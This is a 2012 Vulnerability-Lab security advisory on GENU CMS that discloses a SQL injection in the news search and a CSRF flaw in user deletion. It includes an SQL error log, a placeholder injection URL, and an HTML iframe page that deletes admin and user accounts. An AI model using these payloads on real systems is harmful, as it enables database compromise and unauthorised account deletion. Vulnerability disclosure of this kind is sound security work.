Title:
======
GENU CMS 2012.4 - Multiple Web Vulnerabilities


Date:
=====
2012-05-06


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=519


VL-ID:
=====
519


Common Vulnerability Scoring System:
====================================
7.5


Introduction:
=============
GENU is a Content Management System written with PHP language and using a database server 
(MySQL, PostgreSQL or SQLite) for storage. It is fully customisable since it uses a templates 
system and supports multiple languages. GENU is an open-source software distributed under 
the terms of the GNU GPL license version 3.

- Easy installation
- Full customisation with templates
- Multiple languages interface
- Unlimited news organised into unlimited categories
- Comments system with reply and edit possibilities
- Articles management
- Users management
- Bulletin board
- Polls
- Complete administration interface
- Search engine
- Submit and send news functions
- Smilies support
- BBCodes or HTML tags support
- Headlines generation
- ...

(Copy of the Vendor Homepage: http://www.gnew.fr/news/index.php )


Abstract:
=========
A Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in GENU CMS 2012-3 content management system.


Report-Timeline:
================
2012-04-16:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
1.1
A remote SQL Injection vulnerability is detected in GENU CMS 2012-3 content management system.
The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands 
on the affected application dbms. Successful exploitation of the vulnerability results in dbms & application compromise.
The vulnerability is located on the username post method.

Vulnerable Module(s):
				[+] Search - news_subject

--- SQL Exception Logs ---
Error in query  SELECT genu_categories.category_id, genu_categories.category_image, 
genu_categories.category_name, genu_news.news_comments, genu_news.news_date, 
genu_news.news_id, genu_news.news_source, genu_news.news_subject, genu_news.news_text, 
genu_users.user_id, genu_users.user_name FROM genu_categories, genu_news, genu_users WHERE 
genu_categories.category_id = genu_news.category_id AND genu_categories.category_level IN 
( 0 ,  2 ) AND genu_news.news_active =  1  AND genu_news.user_id = genu_users.user_id AND 
LOWER(genu_news.news_subject-1 ) LIKE  %news%  ORDER BY news_date DESC LIMIT 0, 30 


Picture(s):
				../1.png
				../2.png


1.2
A csrf vulnerability is detected in GENU CMS 2012-3 content management system. The vulnerability allows
an remote attacker to delete with medium required user inter action administrator, moderator & users without 
checkbox or confirmation by the admin itself.

Vulnerable Module(s):
				[+] Delete User

Picture(s):
				../3.png


Proof of Concept:
=================
1.1
The sql injection vulnerability can be exploited by remote attacker without user inter action. 
For demonstration or reproduce ...

PoC:
http://127.0.0.1:80/genu/news/search.php?search=news&match=news_subject-1%27[SQL-INJECTION]



1.2
The csrf vulnerability can be exploited by remote attacker with medium or high required
user inter action. For demonstration or reproduce ...


PoC:
<html><head><body>
<title>Remote User Delete Exploit</tile>
<iframe src=http://127.0.0.1:80/genu/admin/users.php?action=delete_user&user_id=1>
<iframe src=http://127.0.0.1:80/genu/admin/users.php?action=delete_user&user_id=2>
<iframe src=http://127.0.0.1:80/genu/admin/users.php?action=delete_user&user_id=3>
<iframe src=http://127.0.0.1:80/genu/admin/users.php?action=delete_user&user_id=4>
<iframe src=http://127.0.0.1:80/genu/admin/users.php?action=delete_user&user_id=5>
<iframe src=http://127.0.0.1:80/genu/admin/users.php?action=delete_user&user_id=6>
<iframe src=http://127.0.0.1:80/genu/admin/users.php?action=delete_user&user_id=6>
<iframe src=http://127.0.0.1:80/genu/admin/users.php?action=delete_user&user_id=7>
</body></head></html>


Risk:
=====
1.1
The security risk of the sql injection vulnerability is estimated as high(+).

1.2
The security risk of the csrf vulnerability is estimated as medium(-).


Credits:
========
Vulnerability Laboratory [Research Team]  -    Chokri B.A. (meister@vulnerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply.

Domains:	www.vulnerability-lab.com   - www.vuln-lab.com
Section:	video.vulnerability-lab.com - forum.vulnerability-lab.com - news.vulnerability-lab.com
Contact:	admin@vulnerability-lab.com - support@vulnerability-lab.com - irc.vulnerability-lab.com

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab Research Team or its suppliers.

    						Copyright © 2012 Vulnerability-Lab




-- 
VULNERABILITY RESEARCH LABORATORY TEAM
Website: www.vulnerability-lab.com
Mail: research@vulnerability-lab.com

